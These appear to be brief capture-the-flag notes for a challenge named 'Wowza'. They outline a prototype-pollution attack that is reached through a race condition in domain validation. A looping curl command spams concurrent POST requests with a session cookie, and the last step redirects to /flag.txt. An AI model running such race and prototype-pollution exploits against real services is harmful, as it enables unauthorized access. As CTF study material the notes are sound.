# Wowza

- Prootype pollution if we can control the domain. 
    - Race condition in promises in validate, submit multiple times simultaneously and get a domain with '__proto__' verified
    ```
    while true; do curl -i -s -k -X $'POST'  
    -H $'Host: wowza.pwni.ng:38476' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://wowza.pwni.ng:38476/' -H $'Content-Type: application/json' -H $'Content-Length: 29' -H $'Origin: http://wowza.pwni.ng:38476' -H $'Connection: close' \
    -b $'user_token=8a674962-c36b-4601-8853-94ae0a267bca' \
    --data-binary $'{\"domain\":\"hax.perfect.blue\"}' \
    $'http://wowza.pwni.ng:38476/site/validate' & ; don
    ```

- With a verified prototype pollution domain, set the isStale and 302 to /flag.txt 
